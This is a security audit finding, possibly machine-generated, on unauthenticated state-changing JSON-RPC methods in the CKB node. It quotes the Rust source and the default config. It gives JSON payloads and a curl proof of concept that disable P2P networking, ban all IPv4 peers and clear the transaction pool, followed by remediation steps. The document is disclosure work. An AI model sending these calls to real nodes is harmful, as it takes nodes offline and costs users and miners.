### Title
Unauthenticated State-Modifying RPC Methods Allow Any Local Process to Disable P2P Networking or Clear the Transaction Pool — (`rpc/src/server.rs`, `rpc/src/module/net.rs`, `rpc/src/module/pool.rs`)

---

### Summary

The CKB JSON-RPC server exposes privileged, state-modifying methods — including `set_network_active`, `clear_tx_pool`, `set_ban`, and `clear_banned_addresses` — without any authentication or authorization mechanism at the code level. The `handle_jsonrpc` dispatcher in `rpc/src/server.rs` processes every incoming request unconditionally, with no credential check, token validation, or caller identity verification. Any process that can reach the RPC port (by default `127.0.0.1:8114`) can invoke these methods and alter critical node state. This is a direct structural analog to the StakeUp `fullSync`/`setWstTBYBridge` missing-modifier class: functions that must be restricted to a privileged caller carry no enforcement of that restriction in code.

---

### Finding Description

**Root cause — no authentication layer in the RPC dispatcher**

`rpc/src/server.rs` builds the Axum router and dispatches every POST body directly to `io.handle_call(call, T::default())`:

```rust
// rpc/src/server.rs lines 218-258
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    ...
    Ok(request) => match request {
        Request::Single(call) => {
            let result = io.handle_call(call, T::default()).await;
            ...
        }
        Request::Batch(calls) => { ... }
    }
}
```

There is no middleware, no `Authorization` header check, no token, and no IP-allowlist enforcement at the handler level. The router also applies `CorsLayer::permissive()`, which accepts requests from any origin. [1](#0-0) [2](#0-1) 

**Privileged methods with no access guard**

`rpc/src/module/net.rs` implements `set_network_active`, `set_ban`, `clear_banned_addresses`, `add_node`, and `remove_node`. None of these implementations contain any caller-identity check:

```rust
// rpc/src/module/net.rs line 772
fn set_network_active(&self, state: bool) -> Result<()> {
    self.network_controller.set_active(state);
    Ok(())
}

// rpc/src/module/net.rs line 686
fn clear_banned_addresses(&self) -> Result<()> {
    self.network_controller.clear_banned_addrs();
    Ok(())
}
``` [3](#0-2) [4](#0-3) 

The trait declarations confirm these are plain `#[rpc]`-annotated methods with no guard attribute: [5](#0-4) [6](#0-5) 

The pool module similarly exposes `clear_tx_pool` and `remove_transaction` with no authentication. [7](#0-6) 

**Attacker-controlled entry path**

The default listen address is `127.0.0.1:8114`. [8](#0-7) 

Any process running on the same host as the CKB node — a co-located application, a malicious script, a compromised dependency, or a web page exploiting SSRF against a locally-running service — can issue a plain HTTP POST to `http://127.0.0.1:8114` with no credentials. The prompt explicitly lists "supported local CLI/RPC user" as a valid attacker profile. No privileged OS access, no leaked keys, and no operator interaction are required.

**Exploit flow**

1. Attacker gains code execution on the same host (e.g., via a compromised npm/cargo dependency in a co-located dApp, or via SSRF from a web service on the same machine).
2. Attacker sends:
   ```json
   {"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}
   ```
   to `http://127.0.0.1:8114`.
3. `set_network_active(false)` calls `self.network_controller.set_active(false)` with no guard — the node's entire P2P layer is disabled immediately.
4. The node stops receiving blocks and transactions, stops relaying, and falls behind the chain tip silently. Miners using this node receive stale block templates and waste hashpower. Wallets connected to this node see a frozen chain.

Alternatively:
```json
{"jsonrpc":"2.0","method":"clear_banned_addresses","params":[],"id":1}
```
clears all operator-configured bans, re-admitting previously-banned malicious peers.

Or:
```json
{"jsonrpc":"2.0","method":"set_ban","params":["0.0.0.0/0","insert",null,null,""],"id":1}
```
bans the entire IPv4 address space, disconnecting all peers.

---

### Impact Explanation

- **`set_network_active(false)`**: Complete P2P isolation of the node. The node stops syncing, stops relaying transactions and blocks, and miners receive stale templates. This is a targeted, silent denial-of-service against a specific node operator.
- **`clear_tx_pool` / `remove_transaction`**: Evicts pending transactions, causing fee loss for users and disrupting miners' revenue by emptying the block assembly queue.
- **`set_ban` / `clear_banned_addresses`**: Manipulates the peer ban list, either re-admitting banned malicious peers or banning all peers, disrupting the node's connectivity.
- **`add_node`**: Forces the node to connect to attacker-controlled peers, enabling eclipse-attack setup as a follow-on step.

The impact category is **unauthorized state change** and **service unavailability** — matching the target scope.

---

### Likelihood Explanation

- The RPC is bound to `127.0.0.1` by default, which limits the attack surface to processes on the same host.
- However, CKB nodes are routinely co-located with dApps, wallets, indexers, and other services. A single compromised dependency in any of those co-located processes is sufficient.
- No credentials, no special OS privileges, and no user interaction are required — a single HTTP POST suffices.
- The `CorsLayer::permissive()` setting means that if the RPC is ever rebound to `0.0.0.0` (a documented configuration option), any web page can trigger these calls via a browser on the same LAN.
- Likelihood is **medium**: requires co-location or SSRF, but no other preconditions.

---

### Recommendation

1. **Add an authentication middleware** to the Axum router in `rpc/src/server.rs` that validates a configurable bearer token or HTTP Basic Auth credential for all state-modifying methods before dispatching to `io.handle_call`.
2. **Separate read-only from write methods** at the router level: read-only methods (`get_*`, `local_node_info`, `sync_state`, etc.) may remain unauthenticated on localhost; write methods (`set_network_active`, `set_ban`, `clear_banned_addresses`, `clear_tx_pool`, `remove_transaction`, `add_node`, `remove_node`) must require a credential.
3. As a defense-in-depth measure, remove `CorsLayer::permissive()` and replace it with a strict allowlist (e.g., same-origin only) so that browser-based CSRF/SSRF cannot reach write methods even if the port is accidentally exposed.

---

### Proof of Concept

**Precondition**: Attacker has any process running on the same host as the CKB node (e.g., a co-located web server, wallet backend, or malicious script). No credentials required.

**Step 1 — Verify the node is syncing (baseline):**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"sync_state","params":[],"id":1}'
# Returns current tip_number, ibd status, etc.
```

**Step 2 — Disable all P2P networking (no auth required):**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":2}'
# Returns: {"jsonrpc":"2.0","result":null,"id":2}
```

**Step 3 — Confirm node is now isolated:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_peers","params":[],"id":3}'
# Returns: {"jsonrpc":"2.0","result":[],"id":3}  — all peers disconnected
```

**Step 4 — Optionally clear the tx pool:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":4}'
# Returns: {"jsonrpc":"2.0","result":null,"id":4}
```

**Expected outcome**: The node is silently isolated from the P2P network and its transaction pool is emptied. The node operator receives no alert. Miners using this node receive stale block templates. The attack requires zero credentials and a single HTTP POST.

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-260)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
```

**File:** rpc/src/module/net.rs (L286-343)
```rust
    #[rpc(name = "clear_banned_addresses")]
    fn clear_banned_addresses(&self) -> Result<()>;

    /// Inserts or deletes an IP/Subnet from the banned list
    ///
    /// ## Params
    ///
    /// * `address` - The IP/Subnet with an optional netmask (default is /32 = single IP). Examples:
    ///     * "192.168.0.2" bans a single IP
    ///     * "192.168.0.0/24" bans IP from "192.168.0.0" to "192.168.0.255".
    /// * `command` - `insert` to insert an IP/Subnet to the list, `delete` to delete an IP/Subnet from the list.
    /// * `ban_time` - Time in milliseconds how long (or until when if \[absolute\] is set) the IP is banned, optional parameter, null means using the default time of 24h
    /// * `absolute` - If set, the `ban_time` must be an absolute timestamp in milliseconds since epoch, optional parameter.
    /// * `reason` - Ban reason, optional parameter.
    ///
    /// ## Errors
    ///
    /// * [`InvalidParams (-32602)`](../enum.RPCError.html#variant.InvalidParams)
    ///     * Expected `address` to be a valid IP address with an optional netmask.
    ///     * Expected `command` to be in the list [insert, delete].
    ///
    /// ## Examples
    ///
    /// Request
    ///
    /// ```json
    /// {
    ///   "id": 42,
    ///   "jsonrpc": "2.0",
    ///   "method": "set_ban",
    ///   "params": [
    ///     "192.168.0.2",
    ///     "insert",
    ///     "0x1ac89236180",
    ///     true,
    ///     "set_ban example"
    ///   ]
    /// }
    /// ```
    ///
    /// Response
    ///
    /// ```json
    /// {
    ///   "id": 42,
    ///   "jsonrpc": "2.0",
    ///   "result": null
    /// }
    /// ```
    #[rpc(name = "set_ban")]
    fn set_ban(
        &self,
        address: String,
        command: String,
        ban_time: Option<Timestamp>,
        absolute: Option<bool>,
        reason: Option<String>,
    ) -> Result<()>;
```

**File:** rpc/src/module/net.rs (L419-420)
```rust
    #[rpc(name = "set_network_active")]
    fn set_network_active(&self, state: bool) -> Result<()>;
```

**File:** rpc/src/module/net.rs (L686-689)
```rust
    fn clear_banned_addresses(&self) -> Result<()> {
        self.network_controller.clear_banned_addrs();
        Ok(())
    }
```

**File:** rpc/src/module/net.rs (L772-775)
```rust
    fn set_network_active(&self, state: bool) -> Result<()> {
        self.network_controller.set_active(state);
        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L1-20)
```rust
use crate::error::RPCError;
use async_trait::async_trait;
use ckb_chain_spec::consensus::Consensus;
use ckb_constant::hardfork::{mainnet, testnet};
use ckb_jsonrpc_types::{
    EntryCompleted, OutputsValidator, PoolTxDetailInfo, RawTxPool, Script, Transaction, TxPoolInfo,
};
use ckb_logger::error;
use ckb_shared::shared::Shared;
use ckb_types::core::TransactionView;
use ckb_types::{H256, core, packed, prelude::*};
use ckb_verification::{Since, SinceMetric};
use jsonrpc_core::Result;
use jsonrpc_utils::rpc;
use std::sync::Arc;

/// RPC Module Pool for transaction memory pool.
#[rpc(openrpc)]
#[async_trait]
pub trait PoolRpc {
```

**File:** resource/ckb.toml (L177-184)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}
```
